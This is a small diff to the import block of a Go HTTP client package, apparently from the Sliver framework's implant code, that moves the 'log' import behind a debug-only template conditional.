@@ -20,12 +20,15 @@ package httpclient
 
 import (
 	"crypto/tls"
-	"log"
 	"net"
 	"net/http"
 	"net/url"
 	"sync"
 	"time"
+
+	// {{if .Config.Debug}}
+	"log"
+	// {{end}}
 
 	"github.com/bishopfox/sliver/implant/sliver/proxy"
 )
